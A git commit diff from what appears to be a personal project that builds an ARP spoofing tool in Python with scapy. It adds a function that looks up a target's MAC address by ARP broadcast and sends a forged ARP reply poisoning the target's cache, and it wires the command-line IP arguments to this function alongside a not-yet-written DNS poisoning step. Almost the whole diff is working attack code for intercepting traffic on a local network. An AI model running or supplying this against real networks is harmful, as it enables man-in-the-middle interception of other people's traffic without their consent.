083940863517def2f75410925350c2e2636e2a96
Thorn <thorn.prive@gmail.com>
2019-03-11 11:01:58 +0100

    first iteration of arpspoofing implementation

--- ArpSpoofing.py
+++ ArpSpoofing.py
@@ -6,5 +6,28 @@ class ArpSpoofing:
     def __init__(self):
         pass
 
-    def doSpoof(self):
+    def doSpoof(self, hostToAttack, hostToSpoof):
+
+        def obtainMac(hostToAttack):
+            arpReq = scapy.ARP(pdst=hostToAttack)
+            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+            arpReqBroad = broadcast/arpReq
+            result = scapy.srp(arpReqBroad, timeout=1,verbose=False)[0]
+
+            return result[0][1].hwsrc
+
         print("spoof")
+
+        targetMac = obtainMac(hostToAttack)
+        #op = 2 means that it is a reply
+        packet = scapy.ARP(op=2, pdst=hostToAttack, hwdst=targetMac, psrc=hostToSpoof)
+        scapy.send(packet, verbose=False)
+        print("Spoof Spoof")
+
+
+
+
+
+
+
+
--- main.py
+++ main.py
@@ -1,11 +1,16 @@
 import sys
-from scapy import *
+from scapy.all import *
 from ArpSpoofing import ArpSpoofing
 from DnsPoisoning import DnsPoisoning
 
 if __name__ == "__main__":
     arguments = sys.argv
     ips = []
+    argReq = 3
+
+    if len(sys.argv) != argReq:
+        print("Wrong amount of arguments provide", argReq-1, "arguments")
+        sys.exit(1)
 
     for ip in arguments[1:]:
         ips.append(ip)
@@ -16,7 +21,7 @@ if __name__ == "__main__":
     hostToSpoof = ips[1]
 
     arpSpoofing = ArpSpoofing()
-    arpSpoof = arpSpoofing.doSpoof()
+    arpSpoof = arpSpoofing.doSpoof(hostToAttack, hostToSpoof)
 
     dnsPoisoning = DnsPoisoning()
     dnsPoison = dnsPoisoning.doPoison()
